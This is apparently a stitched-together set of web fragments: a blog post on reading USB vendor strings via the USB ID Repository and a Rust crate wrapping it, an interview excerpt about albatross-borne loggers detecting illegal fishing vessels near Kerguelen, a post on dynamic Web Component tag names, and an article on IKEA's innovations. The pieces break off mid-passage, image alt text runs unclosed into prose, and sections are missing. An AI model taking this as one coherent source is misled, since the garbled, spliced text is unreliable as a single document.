</pre></td><td><pre><span>SUBSYSTEM</span>==<span>"usb"</span>, <span>MODE</span>=<span>"0666"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>But neither of these is a great solution for a userspace program: adding <code>udev</code> rules
is itself a privileged and finicky operation, and opening <em>all</em> USB devices for direct access
makes it easy for users to accidentally soft-lock their devices or expose them to malicious
programs.</p>

<h3 id="device-strings-without-privilege">Device strings without privilege</h3>

<p>If you’ve ever used <code>lsusb</code>, you’ll know that it provides a listing of active USB devices,
including their vendor and product strings:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre><span>$ </span>lsusb
Bus 004 Device 003: ID 2109:0812 VIA Labs, Inc. VL812 Hub
Bus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 003 Device 003: ID 2109:2812 VIA Labs, Inc. VL812 Hub
Bus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub

Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
</pre></td></tr></tbody></table></code></pre></div></div>

<p>But wait, how does <em>that</em> work? <code>lsusb</code> is just a plain old unprivileged program. It links to
<code>libusb</code>, but there’s nothing particularly special about that.</p>

<p>Here’s one of the places it grabs the vendor string:</p>

<p>So it’s a <code>udev</code> API. Specifically, it’s the
<a href="https://www.freedesktop.org/software/systemd/man/hwdb.html"><code>hwdb</code></a> API, which exists as
an in-memory database that gets loaded from (in classic systemd fashion) an opaque
binary blob (<code>/usr/lib/udev/hwdb.bin</code> on my system).</p>

<p>A little bit more digging, and we have our <em>actual</em> answer: the USB parts of the
hardware database are generated from the <a href="http://www.linux-usb.org/usb-ids.html">USB ID Repository</a>.
The USB ID Repository contains a tab-structured database, with entries like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>045e  Microsoft Corp.
  0007  SideWinder Game Pad
  0008  SideWinder Precision Pro
  0009  IntelliMouse
  000b  Natural Keyboard Elite
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In other words: the USB ID Repository is an <em>independent</em>, community-maintained
source of ground truth about USB vendors and their products. <code>lsusb</code> et al. engage
in a bit of sleight of hand by using it behind the scenes, avoiding to open each
device for its metadata.</p>

<h2 id="usb-idsrs">usb-ids.rs</h2>

<p>Finally, the <em>intended</em> content of this post.</p>

<p>usb-ids.rs is <strong>exactly</strong> what it sounds like: a library that wraps the USB ID repository.
Specifically: usb-ids.rs is a <em>generated</em> Rust library that exposes the USB ID repository
as static data. Said generation currently happens with a <em>very</em> hacky parser<sup id="fnref:parser" role="doc-noteref"><a href="#fn:parser">3</a></sup> in the crate’s
<a href="https://github.com/woodruffw/usb-ids.rs/blob/a739b328e165f641dd1109f58dc33ad3c9561958/build.rs">build.rs</a>
script.</p>

<p>Another nice thing: it’s built completely independently from <code>udev</code>, meaning that it can be used
on non-Linux hosts as a source of “canonical” vendor and product names.</p>

<p>The API is extraordinarily simple:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td><pre><span>use</span> <span>usb_ids</span><span>::{</span><span>FromId</span><span>,</span> <span>Vendors</span><span>};</span>

<span>// Iterate over every vendor and device.</span>
<span>for</span> <span>vendor</span> <span>in</span> <span>Vendors</span><span>::</span><span>iter</span><span>()</span> <span>{</span>
    <span>for</span> <span>device</span> <span>in</span> <span>vendor</span><span>.devices</span><span>()</span> <span>{</span>
        <span>println!</span><span>(</span><span>"vendor: {}, device: {}"</span><span>,</span> <span>vendor</span><span>.name</span><span>(),</span> <span>device</span><span>.name</span><span>());</span>
    <span>}</span>
<span>}</span>

<span>// Get a specific vendor by ID.</span>
<span>let</span> <span>vendor</span> <span>=</span> <span>Vendor</span><span>::</span><span>from_id</span><span>(</span><span>0x045e</span><span>)</span><span>.unwrap</span><span>();</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Full documentation is available on <a href="https://docs.rs/usb-ids">docs.rs</a>.</p>

<h3 id="next-steps">Next steps</h3>

<p>As of today, <em>usb-ids.rs</em> is ready to use. I don’t expect the currently implemented APIs to change.</p>

<p>Future releases will focus on exposing additional entities in the USB ID repository.
In particular, future releases will add support for enumerating device classes and subclasses,
as well as various <a href="https://en.wikipedia.org/wiki/USB_human_interface_device_class">HID</a> entities.</p>

The capital, in the northeast, is Port-aux-Français,&nbsp;which has&nbsp;a scientific base&nbsp;of&nbsp;about 80 people. The colony of black-browed albatrosses is 30-40 km away, so we flew there by helicopter.</p><p>It’s a sub-Antarctic island so there are no trees and, above 200-300 metres, no vegetation, only rock. The explorer Captain James Cook called it Desolation Island. There’s a lot of rain and wind and some snow, although it wasn’t very cold. Temperatures ranged from zero to about six degrees.</p><p>I enjoyed it there. We had a nice hut in a small valley along a river.</p><p>Every day we woke at 6am and walked for three quarters of an hour to the colony.</p><p>Black-browed albatrosses nest in cliffs so we had to use a rope to get from the plateau to 200 metres down. We were then in the cliff, on a ledge about two by ten metres with about 200 nests below us. They were part of a larger colony of a thousand pairs.</p><figure data-orig-width="4056" data-orig-height="3040" data-orig-src="https://horizon-media.s3-eu-west-1.amazonaws.com/s3fs-public/IMCEUpload/encode_-_the_coast_with_the_colony_on_the_back_ground.jpg"><img src="https://64.media.tumblr.com/ff1288620f391a2806bf00531fbdab46/0240891bbfec1ec5-a6/s1280x1920/d7f27f9d9f4e21c03eabd3f246ed4a29099c1c22.jpg" alt="The three researchers flew by helicopter to a sub-Antarctic island which is home to black-browed albatrosses perched on cliffs.

When the partner comes back it takes over the egg and the other one goes. We wanted to attach loggers to the birds at the time they were departing, so we had to wait for changeovers.</p><p>Each time there was a changeover we went further down with a rope to reach that nest. It took three of us – one to capture and hold the bird, one to attach the logger and the third to take notes and weigh the bird.</p><p>They are very tame so you can come very close without any problem. That’s the advantage of working with albatrosses.</p><figure data-orig-width="4032" data-orig-height="3024" data-orig-src="https://horizon-media.s3-eu-west-1.amazonaws.com/s3fs-public/IMCEUpload/field_hut_under_the_snow.jpg"><img src="https://64.media.tumblr.com/0605ae2b0d918afe3fc28a494d0437e5/0240891bbfec1ec5-13/s1280x1920/8b4045f0691fb7b55f5b17dfc5660fbdf26175bc.jpg" alt="The team stayed in a hut about a 45-minute walk away from the albatross colony they were studying.

Other days we did about ten. It depends on the wind. Albatrosses use wind to travel to reduce flight (energy) costs, so if&nbsp;the wind is&nbsp;not favourable, it takes more time for the birds to return to the colony.&nbsp;</p><p>The days were uncomfortable but we had good equipment, we had a lot of nice tea. And&nbsp;the site&nbsp;is very beautiful – it’s a&nbsp;spectacular cliff, you have the very rough sea and you have all the albatrosses flying around. Sometimes when it’s snowing it’s a bit cold, but otherwise it’s a very nice spot. It’s not difficult work so long as you don’t&nbsp;get vertigo in&nbsp;these steep cliffs.</p><p>After about eight days we had&nbsp;equipped&nbsp;40 albatrosses with our new loggers. The birds are at sea for about 10 days so, after a few more days, the first ones started to return and we recovered the loggers.</p><figure data-orig-width="4928" data-orig-height="3264" data-orig-src="https://horizon-media.s3-eu-west-1.amazonaws.com/s3fs-public/IMCEUpload/black_browed_colony1_0.jpg"><img src="https://64.media.tumblr.com/408899cf4e1457ebbdaef1c0a71a0583/0240891bbfec1ec5-db/s1280x1920/31ebd346db2e1bd55015ce19216517d6b1eb6d61.jpg" alt="The researchers used ropes to reach the albatross nests.

Black-browed albatrosses weigh 3 kg and so we made new loggers that were half the size.</p><p>Both new and old loggers had GPS antennae so we knew where the birds were. They also had radar detectors. But the new (lighter) loggers could not transmit their data. That’s why we had to retrieve them.</p><p>Each day at 6pm we had to contact our base (in Port-aux-Français) using a satellite phone to tell them that we were safely on the way back to the hut. They were nervous about our safety. That one minute on the sat phone was our only connection to the outside world. But it was quite nice because we had no information – nothing about COVID and all the problems.</p><p>In the evening we downloaded the data from the loggers onto our computers.</p><p>When the month was finished, to get back to the base we had to walk four hours and take a small boat for four hours across the bay. From there we took the next supply ship back to Réunion.</p><figure data-orig-width="3900" data-orig-height="2626" data-orig-src="https://horizon-media.s3-eu-west-1.amazonaws.com/s3fs-public/IMCEUpload/black_browed_albatross_in_flight_with_logger_0360.jpg"><img src="https://64.media.tumblr.com/d9fd9b87d9606f27c44c51be573232a0/0240891bbfec1ec5-35/s1280x1920/8e9679b9d50a630e63a69a313b0157078759a9d5.jpg" alt="The information retrieved from the loggers will be used to detect illegal fishing boats, with switched off transponders.

If they switch them off they are probably doing illegal fishing. While we were on Kerguelen I had someone downloading all the movements of declared vessels in the southwestern Indian Ocean from their AIS (Automatic Identification System) transmissions. When I return to France, we will be able to tell whether the boats that were detected by the albatrosses had an AIS signal. If they don’t, then they were illegal if they were found in a national economic zone.</p><p>In our previous work we found that at a third of the boats were not using their transponders. We detected some sectors where there are a lot of illegal boats, for example around the Prince Edward Islands which are in South African waters.</p><p>This time we will have information from a different species, one that is even more attracted by fishing vessels. So we are expecting to have detected even more boats around Kerguelen. We are discussing (our findings) with the French authorities. This information will be used in the future for surveillance.</p><p>We are also interested in understanding whether the birds (that hang around) vessels gain more mass than birds foraging naturally. The question of mass gain is important when studying seabird-fisheries interactions. On the one hand there is a risk of being ensnared in on the lines, but there might be an advantage of gathering easy food.</p><figure data-orig-width="1080" data-orig-height="1080" data-orig-src="https://horizon-media.s3-eu-west-1.amazonaws.com/s3fs-public/IMCEUpload/map-kerguelen6.jpg"><img src="https://64.media.tumblr.com/318663e9508fcfe6ed579b04bc49665e/0240891bbfec1ec5-2a/s1280x1920/51326a411eb8990166edaf8cac0c6cbf781cecba.jpg" alt="It takes 15 days to travel by supply ship from the Indian Ocean island of Réunion to the Kerguelen Islands.

			<p> I explore tag creation in this post. How can Web Components be used to create dynamic tags? And what use are they? As an example, I try to make a simple style container that uses them. </p>

		<p>JavaScript(JS) allows object classes to be anonymous. No need to name them and bind your class to an identifier. Instead of <code>class MyClass { ... }</code> write <code>class { ... },</code> and it will be created without a name. </p>
<p>Likewise prefix a regular <abbr title="JavaScript">JS</abbr> object <code>{ ... }</code> with <code>class</code> and have an anonymous class defined.</p>
<p><img src="https://hugodaniel.com/images/HTML5_badge_tag.png" alt="Three HTML5 badges in a row inside angle brackets like an html tag name. The first one has the normal orientation. The second one is upside down. The third one has a random orientation." title="Let those tags roll!"></p>
<p>Nothing special here, classes are in fact normal <abbr title="JavaScript">JS</abbr> objects. The big extra is that anonymous classes, just like normal classes, can use the <abbr title="JavaScript">JS</abbr> <code>extends</code> syntax to easily carry other objects and acumulate them.</p>
<pre><code data-lang="javascript"><span>class </span><span>SomeContext </span><span>{
	</span><span>name </span><span>= "</span><span>What do Web Components have to do with this?</span><span>"
</span><span>}

</span><span>let </span><span>withExtraContext </span><span>= new (</span><span>class extends </span><span>SomeContext </span><span>{
    </span><span>displayName</span><span>() </span><span>{
        </span><span>alert</span><span>(</span><span>this</span><span>.name);
    }
}</span><span>)

</span><span>withExtraContext</span><span>.</span><span>displayName</span><span>()
</span></code></pre>
<p>It is possible to pick our favorite class and create other unique classes from it that are, in fact, just declaration copies that add nothing at all. Unique copies of class declarations. Here is an example:</p>
<pre><code data-lang="javascript"><span>class </span><span>VeryComplicatedClass </span><span>{
  </span><span>foo </span><span>= "</span><span>bar</span><span>"
</span><span>}

</span><span>let </span><span>MyUniqueCopy </span><span>= (</span><span>class extends </span><span>VeryComplicatedClass </span><span>{}</span><span>)

</span><span>console</span><span>.</span><span>log</span><span>(
  </span><span>MyUniqueCopy </span><span>instanceof VeryComplicatedClass
); </span><span>// prints false

</span><span>let </span><span>anOriginalInstance </span><span>= new VeryComplicatedClass(); 
</span><span>let </span><span>myUniqueCopyInstance </span><span>= new MyUniqueCopy();

</span><span>console</span><span>.</span><span>log</span><span>(
  </span><span>anOriginalInstance </span><span>instanceof VeryComplicatedlass,
  </span><span>myUniqueCopyInstance </span><span>instanceof MyUniqueCopy
); </span><span>// prints true, true

</span></code></pre>
<p>But what do Web Components have to do with all of this?</p>
<h2 id="it-is-awesome">It is awesome</h2>
<p>The global <code>customElements</code> registry (the global var that browsers have, where new tag names get defined) only allows one class to be associated with a single tag. Once a class has a corresponding tag-name set to it, it is no longer possible to set another-tag-name (nor delete it, but that's for another post, hehehe).</p>
<p>It makes sense. Why associate two tag names to the same class anyway? I don't know, but I still want to be able to do that nevertheless :)</p>
<pre><code data-lang="javascript"><span>class </span><span>Awesomeness </span><span>extends </span><span>HTMLElement </span><span>{}

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>awesome-tag</span><span>", </span><span>Awesomeness</span><span>);
</span><span>// ^ all good, ready to use &lt;awesome-tag&gt; all over the HTML code.

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>i-want-to-be-awesome-too</span><span>", </span><span>Awesomeness</span><span>);
</span><span>// ^ No, you don't. This will throw an error.
</span></code></pre>
<p><img src="https://hugodaniel.com/images/customElementsError.png" alt="The error text: &quot;Uncaught DOMException: CustomElementRegistry.define: 'i-want-to-be-awesome-too' and 'awesome-tag' have the same constructor&quot;" title="Nope"></p>
<p>Anonymous classes provide a simple way to avoid this limitation. By extending the Web Component class and using the unique copy of its declaration as a different tag-name. Like so:</p>
<pre><code data-lang="javascript"><span>class </span><span>Awesomeness </span><span>extends </span><span>HTMLElement </span><span>{}

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>awesome-tag</span><span>", </span><span>Awesomeness</span><span>);
</span><span>// ^ all good, like before

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>i-can-be-awesome-too</span><span>", </span><span>class extends </span><span>Awesomeness </span><span>{}</span><span>);
</span><span>// ^ yay \o/

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>me-too</span><span>", </span><span>class extends </span><span>Awesomeness </span><span>{}</span><span>);
</span><span>// ^ party!

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>lets-all-be-awesome</span><span>", </span><span>class extends </span><span>Awesomeness </span><span>{}</span><span>);
</span><span>// ^ ok, you get the idea
</span></code></pre>
<p>The code above uses multiple tag names for the same class. :)</p>
<p>It also allows the tags <code>&lt;awesome-tag&gt;</code>, <code>&lt;i-can-be-awesome-too&gt;</code>, <code>&lt;me-too&gt;</code> and <code>&lt;lets-all-be-awesome&gt;</code> to be used in <abbr title="HyperText Markup Language">HTML</abbr> and all of them will share the same functionality (because they all have <code>Awesomeness</code>).</p>
<p><em>But since they all have the same functionality, why couldn't I use a single tag name?</em></p>
<p>That is an excellent question. Having multiple tag names for the same class is the first step I found in dynamic HTML tags that can have any name and be defined only after.</p>
<h2 id="my-head-is-too-big-for-hats-and-too-small-to-understand">My head is too big for hats and too small to understand</h2>
<p>This section is the part where I am going to create dynamic tag names with anonymous classes.</p>
<p><img src="https://hugodaniel.com/images/html5_hat.png" alt="The HTML5 badge with a handrawn hat on the top of it." title="My mother said it was cool"></p>
<p>Since I can't explain this well, let me try to do it with an example: a style container.</p>
<h3 id="style-container">Style container</h3>
<p>Nowadays, there is a big wave of these CSS-In-JS-In-HTML-In-React-In-Vue-In-IOS-In-CSS-In-... approaches. People get upset with each other because of those styled-components vs. styled-system vs. styled-tailwind-my-head-is-bigger-than-yours arguments.</p>
<p>I don't like any of them, plain <abbr title="Cascading Style Sheets">CSS</abbr> is still king in my small street, but that doesn't mean that I can't try to add yet another styling approach to the mix. After all, this is such a pleasant hill to die at.</p>
<h3 id="stylecontainer">StyleContainer</h3>
<p>This new <abbr title="Cascading Style Sheets">CSS</abbr> framework is going to be made by just two classes. A container class and a class for the children.</p>
<p>The purpose of the children's class will be to hold a bunch of CSS inline style parts. It starts by reading its <code>textContent</code> and place it as a style part of itself.</p>
<pre><code data-lang="javascript"><span>class </span><span>StyleChild </span><span>extends </span><span>HTMLElement </span><span>{
    </span><span>parts </span><span>= </span><span>[]

    </span><span>initialize</span><span>() </span><span>{
        </span><span>this</span><span>.</span><span>parts </span><span>= </span><span>[</span><span>this</span><span>.</span><span>textContent</span><span>]
    }
	
    </span><span>// Initialize when added to a parent node
    </span><span>connectedCallback</span><span>() </span><span>{ </span><span>this</span><span>.</span><span>initialize</span><span>() }
}
</span></code></pre>
<p>For the <code>StyleContainer</code>, I want it to read whatever children tag names it might have and create a new Web Component for each of those new tags.</p>
<pre><code data-lang="javascript"><span>class </span><span>StyleContainer </span><span>extends </span><span>HTMLElement </span><span>{
    </span><span>initialize</span><span>() </span><span>{

        </span><span>for </span><span>(</span><span>const </span><span>child </span><span>of </span><span>this</span><span>.</span><span>children</span><span>) {

            </span><span>const </span><span>childName </span><span>= </span><span>child</span><span>.tagName.</span><span>toLocaleLowerCase</span><span>();

            </span><span>// Make the child become a new Web Component
            // if it was not yet made one. 
            </span><span>if </span><span>(</span><span>!</span><span>customElements</span><span>.</span><span>get</span><span>(</span><span>childName</span><span>)) {

                </span><span>customElements</span><span>.</span><span>define</span><span>(</span><span>childName</span><span>, </span><span>class extends </span><span>StyleChild </span><span>{});

            }
        }
    }
    </span><span>// Initialize when added to a parent node
    </span><span>connectedCallback</span><span>() </span><span>{ </span><span>this</span><span>.</span><span>initialize</span><span>() }
}
</span></code></pre>
<p><em>What does this do?</em></p>
<p>It reads the children's tag names (whatever they are) and turns them into a Web Component (provided they are <a href="https://html.spec.whatwg.org/multipage/custom-elements.html#valid-custom-element-name">valid Web Component tag names</a>).</p>
<p><em>Does it even work?</em></p>
<p>Yes! <cite>Because element definition can occur at any time, a non-custom element could be created, and then later become a custom element after an appropriate definition is registered. We call this process "upgrading" the element, from a normal element into a custom element.</cite> (says the spec)</p>
<p><em>But I mean, what? Why? WTF?</em></p>
<p>Yeah, I don't know, but it gets better.</p>
<h3 id="style-container-1"><code>&lt;style-container&gt;</code></h3>
<p>The above code allows HTML to be written with some sort of <abbr title="HyperText Markup Language">HTML</abbr> variable buckets.</p>
<pre><code data-lang="html"><span>&lt;</span><span>body</span><span>&gt;
	&lt;</span><span>button</span><span>&gt;Spank me&lt;/</span><span>button</span><span>&gt;

	&lt;</span><span>style-container</span><span>&gt;
		&lt;</span><span>super-border</span><span>&gt;
			border: 5px dashed mediumseagreen;
			box-shadow: 0 0 0 3px;
		&lt;/</span><span>super-border</span><span>&gt;

		&lt;</span><span>fancy-background</span><span>&gt;
			background: #563f0e;
		&lt;/</span><span>fancy-background</span><span>&gt;

		&lt;</span><span>a-cool-font</span><span>&gt;
			font-family: Marcellus, serif;
			font-size: 3em;
			text-shadow: 0 2px #fff;
		&lt;/</span><span>a-cool-font</span><span>&gt;
	&lt;/</span><span>style-container</span><span>&gt;
&lt;/</span><span>body</span><span>&gt;
</span></code></pre>
<p>When the <code>StyleContainer</code> gets <code>define</code>d at the <code>customElements</code> registry (with the <code>"style-container"</code> tag name), the above code run its logic. It looks for the children and creates the tags <code>&lt;super-border&gt;</code>, <code>&lt;fancy-background&gt;</code> and <code>&lt;a-cool-font&gt;</code>.</p>
<p>These tag names can have the semantic value of a variable. <abbr title="HyperText Markup Language">HTML</abbr> variables. Or any other semantic value or purpose that might be fit. Anonymous classes create dynamic tag names, where you place whatever name you want in the HTML. After that, it is up to the intended implementation/framework/idea to give them meaning and flow.</p>
<h3 id="references-said-the-referee">"References" said the referee</h3>
<p>The HTML code can then reference these dynamic tags.</p>
<p>They can be used to compose more complex styles. With a composer Web Component, lets say... the <code>&lt;import-style&gt;</code> Web Component (not yet defined):</p>
<pre><code data-lang="html"><span>&lt;</span><span>body</span><span>&gt;
	&lt;</span><span>button</span><span>&gt;Spank me&lt;/</span><span>button</span><span>&gt;

	&lt;</span><span>style-container</span><span>&gt;
		&lt;</span><span>magic-button</span><span>&gt;
			&lt;</span><span>import-style </span><span>src</span><span>="</span><span>super-border</span><span>"&gt;&lt;/</span><span>import-style</span><span>&gt;
			&lt;</span><span>import-style </span><span>src</span><span>="</span><span>fancy-background</span><span>"&gt;&lt;/</span><span>import-style</span><span>&gt;

			padding: 2rem;
			text-transform: uppercase;
			pointer: cursor;
		&lt;/</span><span>magic-button</span><span>&gt;

		&lt;</span><span>super-border</span><span>&gt;
			border: 5px dashed mediumseagreen;
			box-shadow: 0 0 0 3px;
		&lt;/</span><span>super-border</span><span>&gt;

		&lt;</span><span>fancy-background</span><span>&gt;
			background: #563f0e;
		&lt;/</span><span>fancy-background</span><span>&gt;

		&lt;</span><span>a-cool-font</span><span>&gt;
			font-family: Marcellus, serif;
			font-size: 3em;
			text-shadow: 0 2px #fff;
		&lt;/</span><span>a-cool-font</span><span>&gt;
	&lt;/</span><span>style-container</span><span>&gt;
&lt;/</span><span>body</span><span>&gt;
</span></code></pre>
<p>Or use the dynamic tags as plain references outside of the <code>&lt;style-container&gt;</code>:</p>
<pre><code data-lang="html"><span>&lt;</span><span>body</span><span>&gt;
	&lt;</span><span>button </span><span>styled-by</span><span>="</span><span>magic-button</span><span>"&gt;Spank me&lt;/</span><span>button</span><span>&gt;

...
</span></code></pre>
<ol>
<li>Where the <code>StyleContainer</code> would do something like: </li>
</ol>
<pre><code data-lang="javascript"><span>document.</span><span>querySelectorAll</span><span>("</span><span>[styled-by~='magic-button']</span><span>")
</span></code></pre>
<p>And apply the contents of the <code>magic-button</code> tag to the inline <code>style</code> attribute to the nodes found.</p>
<p><em>How does this differ from plain HTML?</em></p>
<p>It is another way to write it. Maybe it is better than placing "id"'s in common tags, perhaps it goes against the pure HTML semantic values, or perhaps it is just a shitty idea. I have no strong opinion. It is just an idea.</p>
<p><em>Couldn't I just use CSS?</em></p>
<p>Yes.</p>
<p><em>Why all of this, then?</em></p>
<p>I don't know the answer to this. I like the approach of giving logic a declarative front. HTML is good at that. It is declarative and also dynamic through Web Components. How much logic should go into it, or what kind of logic is something that might be cool to find out. I do think <abbr title="Cascading Style Sheets">CSS</abbr> styles definitely should not :D (we already have the <code>class</code> attribute and CSS vars).</p>
<h2 id="conclusion">Conclusion</h2>
<p>I presented a small example of using Web Components to create dynamic tag names. I think that having the possibility to declare a new tag name under a given parent and automatically create it can have some cool opportunities. I don't know the extent of what can be possible or what this might entail, but still, it is something that we can do with Web Components and maybe use to break logic into easily identifiable small parts.</p>

<p>Oh no….

<p>The keyword guiding IKEA’s history is <em>innovation.</em></p>



<p>Ever since its start in 1943, the name IKEA has been synonymous with minimal, cheap furniture that can be bought and assembled in one’s own home. Its first innovation is also its most famous one – the flatpack furniture. By introducing this concept, and moving furniture assembly onto the user – contrary to what other furniture stores were doing – it allowed the company to reduce costs. This concept made IKEA the world’s biggest furniture store, with no real worldwide competition. This enviable position, allowed it to focus on other innovations and products that could improve the IKEA brand and allow the company to enter new markets.</p>



<p>There were, of course, a number of high profile <a href="https://gizmodo.com/the-ikea-tv-reviewed-worse-than-assembling-100-bookshe-5919216">mistakes</a>, but how else would a company from Sweden make €12.4 billion profit, if not for continuously making mistakes and learning from them along the way? The IKEA furniture made in the 1950s might not be fitting for today or appropriate in 10 years, while the food sold by the company 20 years ago might not respect the increasing sustainable lifestyle of many of its customers. The creation of <a href="https://space10.com/">SPACE10</a>, IKEA’s very own <a href="https://x.company/">‘X</a>’, the former Google X, has helped the company to experiment with new concepts and projects to address these challenges and keep the company on the forefront to new challenges. IKEA is changing how customers live, eat, and work, and its future will have a bigger role in our everyday lives.</p>



<p>There are four main areas where I believe IKEA is spearheading new concepts, new technology, and better practices:</p>



<ol><li>Food</li><li>Housing</li><li>the Smart Home</li><li>Augmented Reality</li></ol>



<p>I’ll delve deeper into each category and explain how IKEA is expected to be innovating in each, and then we’ll briefly look at how IKEA has the potential to rival Amazon, as it makes the jump from a furniture store to the everyday store.</p>



<h3>1. Food</h3>



<p>A few years after the flatpack furniture was invented, IKEA started opening IKEA Bistros and food markets, in its out-of-town stores.</p>



<p><em>“It’s difficult to do business with someone on an empty stomach.”</em></p>



<p>These were the words of IKEA founder Ingvar Kamprad, who wanted to start serving food to the people spending whole days at IKEA stores out of the city. What better way to keep customers at your store than to offer them cheap AND good food?</p>



<p>The meatball remains an IKEA favourite, and the word itself has become as synonyms to IKEA as the flatpack furniture. With millions of IKEA meatballs sold each year, you would think the company would not want to upset the cart by changing recipes and adding new items to the menu. However IKEA did just that, and in mid-2020 it rolled out its ‘<a href="https://www.ikea.com/kr/en/p/allemansraetten-vegetable-balls-frozen-100-vegetables-40346434/">veggie balls</a>’ and the ‘<a href="https://www.ikea.com/gb/en/this-is-ikea/sustainable-everyday/veggie-hot-dog-plant-based-goodness-pub166a3131">veggie hotdog</a>’ for public consumption. Two of the most famous IKEA food staples now have their vegetarian version, with the veggie balls producing around 15 to 20 times less carbon footprint than the meatballs. IKEA also joined forces with other organisations to buy sustainably farmed <a href="https://www.ikea.com/gb/en/this-is-ikea/sustainable-everyday/patar-special-edition-from-uganda-with-love-a-very-special-single-origin-100-arabica-coffee-pub1e423691">coffee</a>, and <a href="https://www.ikea.com/gb/en/this-is-ikea/sustainable-everyday/egentid-good-for-you-the-farmers-and-the-planet-pub561f3b31">tea</a> and created the ‘IKEA Food <a href="https://www.ikea.com/gb/en/this-is-ikea/sustainable-everyday/ikea-food-better-chicken-pub4fcff351">Better Chicken</a>’ programme which seeks to source chicken under strict animal welfare criteria.</p>



<div id="w-node-0c78ba3acc40"><figure><img src="https://i2.wp.com/uploads-ssl.webflow.com/5f9dc8a1a036811f1b6788fb/5f9eb99db1a0428adda3ed5a_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F0d586b7c-d38b-4215-84a6-c66fc5f76825_1200x800.jpeg?w=640&amp;ssl=1" alt="" data-recalc-dims="1"></figure></div>



<p>Like other companies in the food sector, IKEA recognises the increasing number of individuals becoming aware of the carbon footprint needed to sustain the current consumption pattern. SPACE10 has been trying to build on the meatball’s legacy by creating new concepts which leave a much smaller carbon footprint, like meatballs made from artificial meat and those made from insects, which are not unconventional ideas in 2020, even if they have yet to enter the mainstream markets. The Lab also has a concept of a 3D printed meatball, which is more of an aesthetical project rather than a ready-to-serve meatball, however, this goes to show how SPACE10 is seeking to broaden the perspective of both IKEA itself, as well as its customers, to future possibilities in the food sector.</p>



<h3>2. Housing</h3>



<p>In the early 1990s, IKEA realised that the <a href="https://data.oecd.org/price/housing-prices.htm">increase in residential property prices</a> is making it harder and harder for certain sections of the population looking to buy a home without having to break the bank. <a href="https://www.boklok.com/">BoKlok</a> was born from an agreement between Swedish construction giants, Skanska, and IKEA, to build and design low-cost housing, complete with, of course, IKEA furnishing. Sweden, Norway, Denmark, and Finland have been the first beneficiaries of this project, while the <a href="https://www.archpaper.com/2020/05/ikea-modular-boklok-development-offshoot-manufacturer/">United Kingdom</a> will be the first country to host BoKlok housing outside of the Nordics.</p>



<p>BoKlok, which was also called ‘<a href="https://medium.com/@bartholomewhearn/the-flat-pack-taken-to-the-next-level-the-boklok-concept-26078e433b3f">the flatpack taken to the next level</a>’, prides itself in using as limited and as sustainable resources as possible. The design and materials used for the pre-fabricated blocks make the houses’ energy-efficient and environmentally sustainable. This modular housing technique, allows BoKlok to build up to 80% of the houses in a factory and then transport and assemble them to the construction site itself.</p>



<div id="w-node-e435fd46d758"><figure><img src="https://i0.wp.com/uploads-ssl.webflow.com/5f9dc8a1a036811f1b6788fb/5f9eb99da95d27563a12bf17_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fe876dbf1-6044-4545-9c0c-99bb6e96fb3c_1200x630.jpeg?w=640&amp;ssl=1" alt="BoKlok UK achieves planning acceptance on first UK development |  www.skanska.co.uk" data-recalc-dims="1"></figure></div>



<p>With BoKlok, IKEA has managed to infiltrate the housing market, and as housing prices continue to rise above median wages, the company will continue to find a market for low-cost housing. What made BoKlok successful, and continues to do so, is the cost-cutting every step of the way, with profits then being passed on to the consumer. A combination of cheap land, a single standard design, and large-volume manufacturing allows IKEA to create entire housing estates while eliminating brokers and their fees. Buying a flat with BoKlok is also as simple as buying a new bed frame from IKEA – you just have to register at the nearest IKEA store for available housing units.</p>



<p>While this is already disruptive in the current housing market, IKEA, or rather IKEA’s SPACE10 has already come up with a BoKlok on steroids – a new concept for future housing and working environment. ‘<a href="https://www.urbanvillageproject.com/">The Urban Village Project</a>’ shares the same aims of BoKlok, that of creating a sustainable and affordable way of living, but it also aims higher – to completely transform the housing market, by “bypassing the interests of short-term investors”. What this means is that the Project looks for financing by collaborating with “pension funds, future-oriented companies and municipalities” in order to drive down costs, and combine the project with co-operative structures to keep housing within the community. All managed through a neat-looking app.</p>



<div id="w-node-2227ad890b79"><figure><img src="https://i0.wp.com/uploads-ssl.webflow.com/5f9dc8a1a036811f1b6788fb/5f9eb99d234ed0583a59caba_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F21b99d3b-2ea6-47b7-b930-5c8a9f0856ff_1200x675.jpeg?w=640&amp;ssl=1" alt="" data-recalc-dims="1"></figure></div>



<p>Related to this, is IKEA’s <a href="https://www.theverge.com/2019/6/4/18652178/ikea-rognan-robot-murphy-bed-furniture-ori-living-democratic-design-days">announcement</a> that it will start to create robotic furniture for small spaces. Rolling out in places like Hong Kong and Japan, micro-apartments will be the first to feel the benefits of the Rognan furniture, which transforms easily depending on what you need to use at the time. The idea is that one will not use a certain section of the place while busy doing something else, like not using the bed if you’re on the sofa – and Rognan helps to maximise space accordingly.</p>



